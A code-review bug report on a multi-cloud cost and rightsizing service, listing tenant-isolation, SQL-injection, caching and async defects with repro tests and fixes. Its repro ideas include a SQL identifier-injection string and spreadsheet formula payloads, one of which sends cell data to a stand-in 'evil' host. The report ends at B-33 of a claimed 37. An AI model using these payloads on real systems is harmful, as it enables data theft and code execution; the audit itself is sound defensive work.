# Area B bug hunt: xamops-service cost / CUR / GCP / Azure / rightsizing / caches

Method: static code reading only. No source edits, no builds, no commit. "confirmed" means unambiguous from the code as read. "suspected" means a plausible defect whose impact depends on runtime or config I did not verify. No secret values were read or printed.

Base path for all files: `xamops-service/src/main/java/com/xammer/cloud/`. Line numbers are from the working tree at the time of reading.

## Totals

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 7 |
| Medium | 16 |
| Low | 12 |
| Total | 37 |

## Checked and found sound (no finding)

- `CurSql`, `CurTagColumns.literal/sqlSafe`, `CurAdvancedMetricsService.literal` and `accountPredicate` (12-digit regex), `CurCostDataSource.resolveGroupColumn` (tag key regex plus normalise), `GcpBillingSql.labelValueExpr` (bound `@labelKey`), `CspBillingQueryService.dimensionColumn` (whitelist). I found no value-position SQL injection from request input in the CUR, GCP-export or CSP date-range paths. The only injection-shaped surface is B-05 (identifiers from config rows).
- `CurInsightsController` calls `denyIfNotEntitled` on the request thread before the cache, and answers 404 for both unknown and not-yours. This is the model the other controllers should follow.
- Azure cost paging (`AzureCostQueryService.runCostQuery`, `AzureArmClient.list`) follows `nextLink` with a page ceiling. `AzureDiskRightsizingController` scopes by client id.
- `RightsizingApplyService` preflight (architecture, instance-store, ASG, state, AZ offering) is thorough.

---

## Critical

### B-01 Critical: every EBS rightsizing endpoint is unauthorised (cross-tenant read, delete and modify)
- File: `controller/EbsDiskRightsizingController.java` (all handlers, e.g. `applyAction` ~L50, `initiateDownsize`, `initiateExpand`, `deletePendingVolume`, `getDiskUsageViaSSM`, `fixSsmPermissions`); `service/EbsDiskRightsizingService.java:1022` `resolveAccount`.
- Description: `resolveAccount` is `findByProviderAccountId(accountId)` and nothing else. There is no `CloudAccountAccessService` call and no `@PreAuthorize` anywhere in the controller or service. `SecurityConfig` ends in `anyRequest().authenticated()`, so any logged-in user of any tenant who knows or guesses a 12-digit AWS account id can: delete an `available` volume (`DELETE_UNATTACHED`), modify volume type or size, start SSM shrink and expand workflows (root shell on the customer's instance), read disk usage via SSM, attach an SSM policy to instances, and read action history. None of the EBS service paths check `accessType == "read-write"` (grep for `read-write` and `getAccessType` in the three EBS services returns nothing), so enforcement depends only on the customer's IAM role.
- Repro / test idea: MockMvc as user of tenant A, `POST /api/xamops/ebs/.../action/{tenantB awsAccountId}` (use the controller's real base path) with `{"volumeId":"vol-x","region":"us-east-1","actionType":"DELETE_UNATTACHED"}`. Expect 403/404; today it reaches `awsClientProvider.getEc2Client(account, region)` for tenant B. Parameterised test over every mapping in the class.
- Suggested fix: resolve the account through `CloudAccountAccessService.requireAwsAccess(currentUser, accountId)` at the top of every handler (same pattern as `CurInsightsController.denyIfNotEntitled`), return 404 on deny, and gate writes on `read-write` access type like `RightsizingApplyService` does.
- Status: confirmed

### B-02 Critical: EC2 rightsizing apply (stop, resize, start) and its read endpoints have no tenant check
- File: `controller/aws/AwsRightsizingController.java:113` (`applyRightsizing`), also `getRecommendations`, the Cost Optimization Hub endpoints; `controller/XamOpsRightsizingController.java:23` (`/live`); `service/RightsizingApplyService.java:70`.
- Description: `applyRightsizing` takes `accountId`, `instanceId`, `targetInstanceType`, `region` as plain request params. `RightsizingApplyService.applyEc2Rightsizing` looks the account up with `findByAwsAccountId(accountId)` and takes `get(0)`. The only authorization is "account is read-write". Any authenticated user can stop and resize another tenant's production instance. The `/live` and `/recommendations` endpoints also return another tenant's instance ids, names and savings, and `forceRefresh=true` makes XamOps call the customer's AWS APIs on demand.
- Repro / test idea: authenticated as tenant A, `POST /api/xamops/rightsizing/apply?accountId=<tenant B read-write account>&instanceId=i-...&targetInstanceType=t3.small&region=us-east-1`. Expect 403/404, observe 202. Unit test: `RightsizingApplyService` with no caller parameter cannot enforce this, so the controller must.
- Suggested fix: `requireAwsAccess` in the controller before calling any service, and pass the resolved `CloudAccount` into the service instead of re-looking it up by id.
- Status: confirmed

---

## High

### B-03 High: EBS disk policy update and delete are IDOR by policy id alone
- File: `controller/EbsDiskRightsizingController.java` (`PUT/DELETE /policies/{policyId}`), `service/EbsDiskRightsizingService.java:366` `updatePolicy`, `:386` `deletePolicy`.
- Description: `updatePolicy(policyId, req)` loads `findById(policyId)` and overwrites name, thresholds, `targetDiskType`, `default`. `deletePolicy` is `deleteById(policyId)`. No account is involved at all, so even the B-01 fix of authorising `{accountId}` routes would leave these open. Policy ids are sequential longs. A changed policy alters what the platform later recommends or auto-applies for another tenant. `updatePolicy` also copies `isDefault` after unsetting only the existing default of `existing.getAccount()`, which is fine, but a malicious `req` can flip another tenant's default.
- Repro / test idea: create a policy as tenant B, `DELETE /policies/{id}` as tenant A, expect 403/404.
- Suggested fix: load the policy, then require access to `policy.getAccount()` before any mutation. Prefer routes of the form `/policies/{accountId}/{policyId}` and verify the policy belongs to that account.
- Status: confirmed

### B-04 High: cost, GCP insights and GCP rightsizing-apply endpoints take an account or project id with no ownership check
- File: `controller/CostController.java` (all, e.g. `getCostBreakdown`, `refreshFromCur`); `controller/gcp/GcpCostInsightsController.java` (all, `section()` at ~L130); `controller/gcp/GcpCostController.java`; `controller/gcp/GcpRightsizingController.java:165` (`/apply`, `/cache/clear`, `/debug`); `controller/gcp/GcpDiskRightsizingController.java:45` (`/action/{accountId}`); `service/CostService.java:193` `getAccount`; `service/gcp/GcpCostInsightsService.java:167` `unavailableReason`.
- Description: None of these controllers reference `CloudAccountAccessService` (the 17 files that do are listed by grep; none are these). `CostService.getAccount` (via `CloudListService.getAccount`) resolves by provider id with no caller. `GcpCostInsightsService` keys everything on `gcpProjectId` and queries BigQuery with the stored credentials, so any user can read another tenant's cost, SKU and resource detail. `GcpRightsizingController./apply` validates only `accessType`, so it stops, resizes and restarts another tenant's GCE instance. `CostController.getCostForecast` also writes accuracy-tracking rows for any account id.
- Repro / test idea: parameterised MockMvc as a user of tenant A against each route with tenant B's id; expect 403/404.
- Suggested fix: reuse `CloudAccountAccessService.requireAccessByIdentifier` / `requireAwsAccess` per route, centrally via a handler interceptor or a shared `@PreAuthorize` bean, and add a test that enumerates all `@RequestMapping`s in these packages and fails if a route is not covered.
- Status: confirmed for `CostController`, `GcpCostInsightsController` and `GcpRightsizingController./apply` (controller and service code read, no caller check). Suspected for `GcpDiskRightsizingController` (I did not read its service for an internal check) and `GcpCostController` (same).

### B-05 High: CSP billing config API has no role or tenant check; accepts and stores a service-account key; table identifiers are string-built into SQL
- File: `controller/gcp/CspBillingConfigController.java` (`/configs` GET/POST/PUT/DELETE, `/sync/{accountId}`, `/sync-all`); `service/gcp/CspBillingQueryService.java:36-49,60-65,95,140-150,172` (`String.format("... FROM `%s.%s.%s`", gcpProjectId, datasetId, tableId)`).
- Description: The class has no `@PreAuthorize` and `SecurityConfig` has no matcher for `/api/xamops/gcp/csp-billing`, so it falls to `anyRequest().authenticated()`. Any tenant user can: list all configs (names and GCP project ids of every reseller), create a config with their own service-account key, replace another config's project, dataset, table or key (`PUT`, which silently re-points every account that links that config, so other tenants' CSP cost pages read attacker-chosen data), delete unlinked configs, trigger `sync-all` (BigQuery spend), and sync any account by primary key (`syncAccount` loads `findById(accountId)` with no access check). `gcpProjectId`, `datasetId`, `tableId` are not validated and are interpolated inside backticks; a value containing a backtick breaks out of the identifier, so a config writer can inject SQL that runs with the stored key's privileges. Parameters (`@projectId`, dates) are bound correctly, so the exposure is limited to these three identifiers.
- Repro / test idea: as a non-admin, `POST /api/xamops/gcp/csp-billing/configs` with `tableId` = "t` WHERE 1=1 UNION ALL SELECT ... -- " and trigger `/sync-all`; unit test `CspBillingQueryService` with a table id containing a backtick and assert the generated SQL is rejected. Authorisation test: any non-SUPER_ADMIN gets 403 on all routes.
- Suggested fix: require `ROLE_SUPER_ADMIN` (or a dedicated CSP admin authority) on the controller. Validate identifiers against `^[A-Za-z0-9_-]{1,128}$` (project) and `^[A-Za-z0-9_]{1,1024}$` (dataset, table) on write and again at query build time. Require `requireAccess` on `/sync/{accountId}`.
- Status: confirmed

### B-06 High: `@Async` on `performRightsizingAsync` is bypassed (self-invocation), so "202 Accepted" blocks the HTTP thread
- File: `service/RightsizingApplyService.java:86` (call), `:214` (`@Async("awsTaskExecutor")`).
- Description: `applyEc2Rightsizing` calls `performRightsizingAsync(...)` on `this`. Spring's proxy-based `@Async` does not apply to calls inside the same bean, so the method runs synchronously on the request thread: `stopInstances`, then `waitUntilInstanceStopped` (the SDK waiter can block for minutes), `modifyInstanceAttribute`, `startInstances`. The controller then reports 202 only after all of that. Behind nginx this will hit gateway or browser timeouts, the user sees an error while the resize may still complete, and a double click starts a second concurrent stop-modify-start on the same instance. The class javadoc and controller message both promise asynchronous behaviour. Note `EbsDiskRightsizingService` explicitly delegates to a separate bean to "preserve @Async proxy", which shows the authors know the rule.
- Repro / test idea: Spring test with a mocked `Ec2Client` whose waiter sleeps; assert `applyEc2Rightsizing` returns before the waiter completes. It will not.
- Suggested fix: move the async body into a separate bean (as the EBS executors do) or inject self-proxy; add an idempotency guard (in-flight set keyed by instance id) to reject a second concurrent apply.
- Status: confirmed

### B-07 High: if the stop-wait fails or times out, the instance is left stopped and never restarted
- File: `service/RightsizingApplyService.java:228-262`.
- Description: `stopped = true` is set only after `waitUntilInstanceStopped` returns. If the waiter throws (timeout, throttling, credential expiry) after `stopInstances` succeeded, `stopped` is still false, the `catch` does not call `restartAfterFailure`, and the instance ends up stopped (or stopping) with no one told except a log line. The same hole applies if `describeInstance(...)` succeeded and `stopInstances` partially applied. A production instance left powered off by an optimisation feature is an outage.
- Repro / test idea: mock `ec2.stopInstances` ok, `ec2.waiter().waitUntilInstanceStopped` throws `SdkException`; verify `startInstances` is called. It is not.
- Suggested fix: set a `stopRequested` flag immediately after `stopInstances` returns and, in the catch, wait for a stable state then start the instance (on its original type) if it is stopped or stopping; surface failure to the user (action record) instead of only logging.
- Status: confirmed

### B-08 High: MTD and last-month cost caches carry no month in the key, and their DB snapshot read has no age check
- File: `service/CostService.java:162-163` (`totalMtdCost-<acct>`, `AWS_MTD_COST::<acct>`), `:294` (`lastMonthCost-<acct>`), `:944-948` (`historicalCost-<acct>-<svc>-<region>-<days>`), DB reads at `:171, :315, :436, :607` (`cachedDataRepository.findById(dbKey)` with no `SnapshotFreshnessService`).
- Description: Redis TTL is 24 h, after which the code falls back to the DB row, which has no expiry and is re-warmed into Redis for another 24 h ("DB snapshot hit ... re-warmed Redis"). The MTD key has no `YearMonth`, so on the 1st of a month, once Redis has expired, the previous month's closing total can be served as "month to date" until something overwrites the row; `lastMonthCost-` has the same shape and can show two months ago. `historicalCost` for `days=30` is keyed by the count, not the end date, so a DB row from weeks ago is served as "last 30 days" and re-warmed repeatedly. `XamOpsRightsizingService` uses `SnapshotFreshnessService.ifFresh`, which proves the intent; the cost service does not. Whether a nightly scheduler masks this in practice I did not verify.
- Repro / test idea: seed `cached_data` `AWS_MTD_COST::123` with last month's value and `lastUpdated` 40 days old, empty Redis, freeze the clock on the 2nd, call `getTotalMonthToDateCost(acct, false)`; expect a recompute, observe the stale value. Same for `historicalCost`.
- Suggested fix: put the `YearMonth` (or end date) in every key, and run DB reads through `SnapshotFreshnessService.ifFresh` with a short max-age for open-period data.
- Status: confirmed (key structure and missing age check are in the code; the user-visible window depends on the refresh scheduler)

### B-09 High (suspected): nightly CSP ingestion calls its own `@Transactional` method, so the lazy association is read with no session
- File: `service/gcp/CspBillingIngestionService.java:35-43` (`ingestAll` calls `ingestForAccountId`), `:56` (`@Transactional ingestForAccountId`), `domain/CloudAccount.java:75-77` (`@ManyToOne(fetch = LAZY) cspBillingConfig`).
- Description: `ingestAll` (the `@Scheduled` entry point) is not transactional and calls `ingestForAccountId` through `this`, so the `@Transactional` proxy advice is skipped. `findById` then returns an entity whose session is closed after the repository call, and `ingestForAccount` immediately calls `account.getCspBillingConfig()` on the lazy proxy. The class comment says this exact pattern throws `LazyInitializationException` outside a web request, which is what the self-invocation recreates. The per-account `catch` in `ingestAll` logs and moves on, so every CSP-managed account would fail nightly with only error logs. I did not run this, and `spring.jpa.open-in-view` does not help because a scheduler thread has no request. The controller path (`syncAccount`) works only because it runs inside the web request.
- Repro / test idea: `@SpringBootTest` with H2/PG test container: persist a CSP-managed account with a config, call `ingestAll()`, assert the cache keys are written. Expect `LazyInitializationException` logged.
- Suggested fix: move the loop body into a separate `@Transactional` bean, or load with `join fetch` (e.g. an `@EntityGraph` query), or annotate `ingestAll` itself.
- Status: suspected

---

## Medium

### B-10 Medium: failures are returned as HTTP 200 with an empty list or 0.0, so a broken source reads as "no spend"
- File: `controller/XamOpsRightsizingController.java:30-36`; `controller/aws/AwsRightsizingController.java:41-51,61-68,84-99`; `controller/gcp/GcpCostController.java:67-105,109-140` (`exceptionally -> ok(emptyList)`); `service/CostService.java:~268` (MTD returns `0.0` on error), `:~695` (breakdown returns `emptyList()`); `service/gcp/CspBillingQueryService.java:82,107,160,183,214` (all return `0.0` or `List.of()` on exception).
- Description: Credentials expiry, Athena or BigQuery failure, a timeout (AWS controller returns 200 empty after 50 s) and genuine zero spend are indistinguishable to the UI. The GCP insights controller deliberately avoids this (its javadoc names the problem), which shows it is a known defect class. Because the CSP ingest then sets `billingDataAvailable` from these values, a transient failure can also flip account flags to "no data".
- Repro / test idea: make the mocked Cost Explorer or BigQuery client throw; assert the endpoint status is not 200-with-empty. Today it is 200.
- Suggested fix: return 502/503 with an error body on exceptions, keep empty 200 only for a successful query with zero rows; callers that cache must not cache failures.
- Status: confirmed

### B-11 Medium: a failed region-offerings lookup turns every recommendation into "Not available in <region>" and the result is cached
- File: `service/XamOpsRightsizingService.java:497` (`return Collections.emptySet(); // Fail safe`), `:427-446` (`validateRecommendationAvailability`), `:215-216` (cache put), `:224-231` (DB save).
- Description: On any exception (throttling, missing `ec2:DescribeInstanceTypeOfferings` permission) the code returns an empty set. `availableTypes.contains(proposedType)` is then false for every candidate, so every Intel and AMD cell is rewritten to "Not available in ap-south-1". `markApplicability` then marks them non-applicable and `repriceOption` skips them, so a transient API error produces a full page of "nothing can be applied" recommendations, written to Redis (60 min) and to the DB snapshot (served for up to 48 h by `SnapshotFreshnessService`). The comment says "fail safe", but it fails in the direction that hides savings. `RightsizingApplyService.isTypeOfferedInZone` makes the opposite choice (fail open) for the same call, which shows the inconsistency.
- Repro / test idea: stub `describeInstanceTypeOfferings` to throw; expect recommendations to keep their targets (or the call to fail), observe "Not available in ...".
- Suggested fix: on failure, skip validation (leave the text) or abort the run without caching; do not cache results produced after a failed lookup.
- Status: confirmed

### B-12 Medium: `CurInsightCache` key is the raw query string, so callers can create unlimited distinct keys (Athena cost and Redis growth)
- File: `service/cur/CurInsightCache.java:207-219` (`keyForCurrentRequest`), `:60` (3-day Redis TTL).
- Description: The key is `PREFIX + accountId + "::" + endpoint + "?" + rawQueryString`. Parameter order (`a=1&b=2` vs `b=2&a=1`), repeated or unknown parameters (`&x=<random>`), and case all create new keys; unknown parameters are not rejected by the controllers. An entitled user can loop with a random extra parameter and force a fresh Athena scan every request (billed to XamOps or the customer, up to 60 s each) and add a Redis entry kept three days plus a `cached_data` row. Keys over 255 characters are only held in Redis (the code warns at WARN and logs the whole key, which is itself user-controlled text). The explicit-suffix overload avoids this, but only `resource-costs` uses it.
- Repro / test idea: call `GET /cur-insights/charges-by-service/{acct}?x=1`, `?x=2`, ... and count `athena.query` invocations (one per request); count keys in Redis.
- Suggested fix: build the key from the parsed, whitelisted parameters (period, basis, service, tag key) in a canonical order, ignore unknown parameters, and rate-limit per account.
- Status: confirmed

### B-13 Medium: no single-flight on a cache miss (stampede)
- File: `service/cur/CurInsightCache.java:127-145,170-188`; `service/gcp/GcpCostInsightsService.java:137-150`.
- Description: `refreshing` guards only the background refresh. On a cold key, N concurrent requests each run `compute.get()` (an Athena or BigQuery scan) because nothing coalesces them. A Cost page that fires 8 to 10 sections in parallel on first view, times several users after a deploy or "Refresh from CUR" (which clears the keys on purpose), multiplies scan cost and queue time against the Athena concurrency limit.
- Repro / test idea: submit 20 concurrent identical requests against a mocked `compute` with a latch; assert `compute` invoked once. It is invoked 20 times.
- Suggested fix: per-key `ConcurrentHashMap<String, CompletableFuture>` single-flight (or a short Redis lock).
- Status: confirmed

### B-14 Medium: CSV export is open to spreadsheet formula injection
- File: `controller/CurInsightsController.java:196-198` (`csvField`), `:178-194` (`toCsv`).
- Description: `csvField` only doubles quotes. Resource ids, names, service and region come from customer-controlled tag values (the `Name` tag). A value starting with `=`, `+`, `-`, `@` (for example `=HYPERLINK("http://evil/?"&A1,"x")`) is executed by Excel or Sheets when someone from finance opens `untagged.csv`. Quoting every field does not neutralise this.
- Repro / test idea: tag a resource `=cmd|' /C calc'!A0`, call `/tag-coverage/{acct}/untagged.csv`, assert the cell starts with an apostrophe or other neutraliser. It does not.
- Suggested fix: prefix a single quote (or tab) to any field whose first character is `= + - @ \t \r`.
- Status: confirmed

### B-15 Medium: the Cost Explorer breakdown drops credits, refunds and tiny rows, so it disagrees with the CUR path and with totals
- File: `service/CostService.java:685` (`.filter(cost -> cost.getAmount() > 0.01)`).
- Description: Groups with an amount of 0.01 or less, which includes every negative group (credits, refunds, EDP discounts), are removed. The CUR path (`CurCostDataSource`) keeps them. The sum of the Cost Explorer breakdown therefore exceeds the true total by the credits, and the same account shows different totals depending on whether a CUR is attached or Cost Explorer is the fallback. `getTotalMonthToDateCost` (which sums CE `total`) and the breakdown disagree on the same page.
- Repro / test idea: stub CE with groups `[EC2: 100, Credit: -20, Tiny: 0.005]`; assert breakdown sum equals 80. Today 100.
- Suggested fix: filter on `Math.abs(amount) > 0.005` or keep all, and put an "Other" row for the remainder so the table sums to the total.
- Status: confirmed

### B-16 Medium: Cost Explorer calls never follow `nextPageToken`
- File: `service/CostService.java` (grep finds no `nextPageToken`; `getCostAndUsage` calls at L259, L375, L500, L672, L1173, L1301, L1521, L1728, L2020, L2201).
- Description: Each call reads only `resultsByTime()` of the first response. CE paginates large GroupBy results (notably `TAG` grouping and `RESOURCE_ID`-like groupings); the remainder is silently dropped and the table total is understated. Whether a given account hits the page limit I cannot tell from code, hence suspected.
- Repro / test idea: stub CE to return `nextPageToken` on the first response; assert a second request is made.
- Suggested fix: loop on `nextPageToken` in a shared helper.
- Status: suspected

### B-17 Medium: any authenticated user can trigger paid provider calls on demand
- File: `controller/CostController.java:~215` (`POST /costs/refresh-from-cur`), every `forceRefresh=true` parameter on `CostController`, `GcpCostController`, `GcpCostInsightsController`, `AwsRightsizingController`, `XamOpsRightsizingController`; `controller/gcp/GcpRightsizingController.java:240` (`/cache/clear`).
- Description: `forceRefresh` bypasses Redis and the snapshot and calls Cost Explorer (about $0.01 per request), Athena, BigQuery (bytes scanned, billed to the customer's project) or EC2 describe APIs. There is no per-user throttle (the plan notes bucket4j covers `/api/dashboard.*` only), and combined with B-04 the caller does not even need to own the account. `/cache/clear` lets a user evict another tenant's rightsizing cache.
- Repro / test idea: loop `GET ...?forceRefresh=true` 1000 times and count provider calls.
- Suggested fix: ignore or throttle `forceRefresh` (min interval per account, held in Redis), restrict to account owners (B-04), return 429.
- Status: confirmed

### B-18 Medium: GCP service-account keys are stored in plaintext and re-read as `String`
- File: `domain/CspBillingConfig.java:~30` (`private String serviceAccountKey`, no `@Convert`), `db/migration/V20260528_1__add_csp_billing_config.sql` (`service_account_key TEXT NOT NULL`), `service/gcp/CspBillingQueryService.java:21` (`getBytes()` default charset).
- Description: The key JSON sits unencrypted in `csp_billing_config`, is part of any DB dump or backup, and is held on the Lombok `@Data` entity (so `toString()`, equals and any debug log of the entity includes it). `@Data` means a stray `log.info("{}", config)` leaks the key. The controller carefully omits the key from DTOs, which is good. `getBytes()` without a charset uses the platform default, so a key containing non-ASCII characters can corrupt on a non-UTF-8 JVM.
- Repro / test idea: `config.toString()` contains the key text; assert it does not. Check column encryption.
- Suggested fix: encrypt at rest (JPA `AttributeConverter` with KMS or a secrets manager reference), `@ToString.Exclude`/`@EqualsAndHashCode.Exclude` on the field, `getBytes(StandardCharsets.UTF_8)`.
- Status: confirmed

### B-19 Medium: Azure Cost Management paging stops silently on a failed later page
- File: `service/azure/AzureCostQueryService.java:83-101`.
- Description: `armClient.post(url, ...)` returning empty on page 2 or later does `break` with no flag, and the method returns the rows from pages already read as if complete. Only hitting `MAX_COST_PAGES` (50) logs a truncation warning. A 429 or transient failure mid-paging therefore yields understated spend for large subscriptions, which are exactly the ones that paginate. The result is then cached by callers.
- Repro / test idea: mock `armClient.post` to return a page with `nextLink` then `Optional.empty()`; assert the method throws or flags `truncated`.
- Suggested fix: throw (or return a result carrying `complete=false`) if any page after the first fails, and do not cache incomplete results.
- Status: confirmed

### B-20 Medium: `DELETE_UNATTACHED` deletes any `available` volume immediately, bypassing the pending-deletion workflow
- File: `service/EbsDiskRightsizingService.java:185` (switch case), `:297-320` (`deleteUnattachedVolume`).
- Description: The code has a tagged pending-deletion flow with a `DeleteAfter` grace period and a "keep" action (`deletePendingVolume` checks the tag), but `applyAction("DELETE_UNATTACHED")` takes `volumeId` from the request body, checks only `state == available`, and calls `deleteVolume` with no snapshot and no grace period. An `available` volume is often a detached data disk awaiting reattachment. Combined with B-01 any user can destroy it.
- Repro / test idea: call `applyAction` with an `available` volume that has no pending-deletion tag; assert refusal. It deletes.
- Suggested fix: require the pending-deletion tag and elapsed `DeleteAfter`, or take a snapshot first; validate that the volume id came from the account's current recommendation list.
- Status: confirmed

### B-21 Medium: one failing region silently yields a partial volume list that is cached
- File: `service/EbsDiskRightsizingService.java:131-139,148-149`.
- Description: A per-region exception returns an empty list and the combined result is cached (`redisCacheService.put(cacheKey, allVolumes, CACHE_TTL_MINUTES)`). A throttled or permission-denied region disappears from recommendations and savings totals (`getTotalPotentialSavings` reads this data) for the TTL, with no indicator. The region fan-out also uses `CompletableFuture.supplyAsync` without an executor, so it runs on the JVM-wide `ForkJoinPool.commonPool` with blocking AWS calls, which can starve other users of the common pool.
- Repro / test idea: make one region's `describeVolumes` throw; assert the result carries a `partial` marker or is not cached.
- Suggested fix: return per-region status, skip caching when any region failed, run on `awsTaskExecutor`.
- Status: confirmed

### B-22 Medium: `RedisCacheService.evict` can throw, turning a completed cloud action into an HTTP 500
- File: `service/RedisCacheService.java:67-74`; callers `service/EbsDiskRightsizingService.java:204-206` (`finally { evict }`), `:497`, `:520`; `service/gcp/GcpCostInsightsService.java:139`.
- Description: `get` and `put` catch every exception, but `evict` calls `redisTemplate.hasKey` and `delete` unguarded. With Redis down or timing out, `applyAction` has already modified or deleted the volume and written the audit row, then the `finally` throws, replacing the success response with a 500. The user retries a destructive action that already happened. `evictByPattern` and `evict` also behave differently under failure.
- Repro / test idea: mock the `StringRedisTemplate` to throw on `hasKey`; call `applyAction` with a successful stub; expect success.
- Suggested fix: wrap `evict` in try/catch like `put`, and drop the `hasKey` pre-check (it is a redundant round trip and a race).
- Status: confirmed

### B-23 Medium (suspected): the same AWS account id on more than one `cloud_account` row is resolved with `get(0)` / `findFirst`
- File: `controller/CurInsightsController.java:~600` (`runWithSource`, `computeResourceChange`, `computePriceVsVolume`, `resourceIdentities`: `findByAwsAccountId(accountId)` then `accounts.get(0)`); `service/RightsizingApplyService.java:70-75`; `security/CloudAccountAccessService.java:requireAwsAccess` (`findFirst` over candidates).
- Description: The repository returns a `List`, which signals multiple rows can share an AWS account id (for example the same account onboarded under two clients, or a re-onboarded account). Authorisation is checked against the first row of one query, while the data is computed from the first row of another query in no declared order, and `CurInsightCache` keys by the 12-digit id only, so two tenants' rows would share cached payloads. I did not confirm a DB uniqueness constraint on `aws_account_id`; if one exists this is moot.
- Repro / test idea: insert two rows with the same `aws_account_id` for different clients; request as the second client; check the 404 and cache sharing.
- Suggested fix: make `aws_account_id` unique per provider or resolve and authorise on the primary key; put the cloud_account primary key in cache keys.
- Status: suspected

### B-24 Medium (suspected): a null `details` map aborts the whole rightsizing run
- File: `service/XamOpsRightsizingService.java:148`.
- Description: `instanceDto.getDetails().get("Type")` has no null guard on the `getAllResources` fallback path. The inventory-plane path guards (`r.getDetails() != null` at L276), which suggests details can be null. One resource with null details throws NPE out of the loop, `getLiveRecommendations` fails, and the controller returns an empty list (B-10), so a single odd instance hides every recommendation for the account.
- Repro / test idea: feed `cloudListService.getAllResources` a `ResourceDto` with `details == null`; assert the other instances still produce recommendations.
- Suggested fix: null-check inside the loop and `continue` with a warning.
- Status: suspected

### B-25 Medium (suspected): CSP query helpers can lose a whole result set on one null row, and hide negative groups
- File: `service/gcp/CspBillingQueryService.java:80,158,181,214` (`row.get("cost").getNumericValue()` without `isNull()` in `runNamedQuery` at the cost read and in `queryBreakdownByDateRange`), `:150` (`HAVING SUM(cost_at_list) > 0`).
- Description: `runNamedQuery` has no `HAVING`, so a group whose `SUM(cost_at_list)` is NULL makes `getNumericValue()` throw `NullPointerException`, and the blanket `catch` returns `List.of()`, discarding every other row. In `queryBreakdownByDateRange` the `HAVING > 0` removes groups with negative net cost, while `queryTotalByDateRange` has no such filter, so the breakdown total and the headline total differ whenever there are negative lines. Whether the reseller export can contain NULL or negative `cost_at_list` I cannot tell.
- Repro / test idea: stub a `TableResult` row with null cost; assert other rows are returned.
- Suggested fix: null-check each cost read, treat NULL as 0, and filter on `ABS(...) > 0` as the AWS side does.
- Status: suspected

---

## Low

### B-26 Low (suspected): default-locale number formatting in outputs that are parsed later
- File: `controller/CurInsightsController.java:188` (`String.format("%.4f", r.cost())` in the CSV, unquoted numeric field); `service/XamOpsRightsizingService.java:~338` (`String.format("%s ($%.2f/mo)")`, `String.format("%.2f%%", utilization)` at L~519).
- Description: `String.format` without a `Locale` uses the JVM default. On a host with a comma-decimal locale the CSV cost column becomes `1,2345`, which splits into an extra column because the field is not quoted. The display strings are later re-parsed by the UI, which expects dots.
- Suggested fix: `String.format(Locale.ROOT, ...)`; set `-Duser.language=en -Duser.country=US` in the container.
- Status: suspected

### B-27 Low: `regionAvailabilityCache` has no TTL and is shared across accounts
- File: `service/XamOpsRightsizingService.java:58,465-467`.
- Description: Keyed by region only and never evicted for the life of the process. A new instance type launch, or an account that has an opt-in region enabled that another does not, sees the first caller's answer forever. Combine with B-11 to see how a poisoned empty-set is not stored (good), but a partial list would be.
- Suggested fix: key by (account, region) with a TTL (for example 24 h).
- Status: confirmed

### B-28 Low (suspected): OTP failure counter is not atomic and may be bypassable by key variation
- File: `service/RedisCacheService.java:230-240,249-253`.
- Description: `increment` and `expire` are two commands; if the process dies between them the counter never expires, and `isOtpLocked` then locks that identifier permanently. The counter key and the OTP key use the identifier exactly as passed (`"LOGIN_OTP:" + email`); if the verify path does not lower-case the email, `A@x.com` and `a@x.com` have independent counters, giving an attacker `5 x variants` guesses. I did not read the callers, so the second half is unverified. (Auth belongs to area D; recorded here because the code is in `RedisCacheService`.)
- Suggested fix: a Lua script or `SET key 1 EX ttl NX` then `INCR`; normalise identifiers before keying.
- Status: suspected

### B-29 Low: `RedisCacheService.get` turns a cached JSON `null` into an NPE-and-miss
- File: `service/RedisCacheService.java:45,57` (`Optional.of(objectMapper.readValue(...))`).
- Description: If the stored string is `null` (`GcpCostInsightsService.cached` calls `put(key, null, ...)` when a compute returns null, for example the savings rate on an export without `cost_at_list`), `readValue` returns null, `Optional.of(null)` throws, the catch logs a WARN and returns empty. The null is stored every time, read every time and logged every time, and the intended 5-minute negative cache never works.
- Suggested fix: `Optional.ofNullable`, and skip `put` for null results.
- Status: confirmed

### B-30 Low: unvalidated numeric inputs in EBS ROI and monitoring; `Map.of(..., e.getMessage())` can itself throw
- File: `service/EbsDiskRightsizingService.java:405-436` (`calculateRoi`), `:640-650` (`getVolumeMonitoring` period selection), `:201` and `controller/EbsDiskRightsizingController.java` catch blocks (`Map.of("error", e.getMessage())`); `:165-175` `applyAction` (`Integer targetSizeGb` unboxed in `applyResize`).
- Description: `calculateRoi` accepts negative `provisionedGb`, `utilizationPct` above 100 or NaN, growth below -100, producing negative sizes and savings; `(int) targetGb` truncates. `getVolumeMonitoring` accepts any `hours`, including 0, negative and huge values, and any value above 72 uses a 3600 s period, so 8,760 hours exceeds CloudWatch's 1,440-datapoint limit. `Map.of` throws NPE on a null value, so any exception with a null message (a bare `RuntimeException`, some SDK exceptions) turns the error handler into an unhandled NPE and a 500 with no body. A missing `targetSizeGb` on EXPAND unboxes null.
- Suggested fix: bean-validate the DTOs, clamp `hours` to the documented set, use `String.valueOf(e.getMessage())`.
- Status: confirmed

### B-31 Low: dead Azure `fetchCostData` mis-parses the date
- File: `service/azure/AzureCostQueryService.java:121,228`.
- Description: `Number` dates go through `LocalDate.ofEpochDay` ("Rare" per the comment), but Azure returns `UsageDate` as `YYYYMMDD` (the maintained path at L439 handles this correctly with `BASIC_ISO_DATE`). Grep finds no caller of this method, so it is not live. It would put costs in month buckets thousands of years in the future if wired back.
- Suggested fix: delete the method or reuse the maintained parser.
- Status: confirmed

### B-32 Low (suspected): `CurInsightCache` month detection and eviction key forms
- File: `service/cur/CurInsightCache.java:340-355` (`isOpenMonth`), `:196-206` (`evictAccount`).
- Description: `isOpenMonth` uses `key.indexOf("period=")`, which also matches inside another parameter name or value (`resourceId=x-period=2020-01`), so a closed-month entry can get the 1 h open-month freshness or the reverse. It compares against `YearMonth.now()` in the server time zone, while CUR billing months are UTC, so around midnight on the 1st the two disagree. `evictAccount(accountId)` clears the prefix for the exact string it is given; `requireAwsAccess` accepts both `12345678901` and `012345678901`, so a request made with the unpadded form is cached under a prefix the evict never matches.
- Suggested fix: parse query parameters properly, use `YearMonth.now(ZoneOffset.UTC)`, canonicalise the account id (zero-pad) before building keys.
- Status: suspected

### B-33 Low: an interrupted Athena wait does not cancel the running query
- File: `service/cur/CurAthenaQueryService.java` (`waitForCompletion`, `catch (InterruptedException)`).
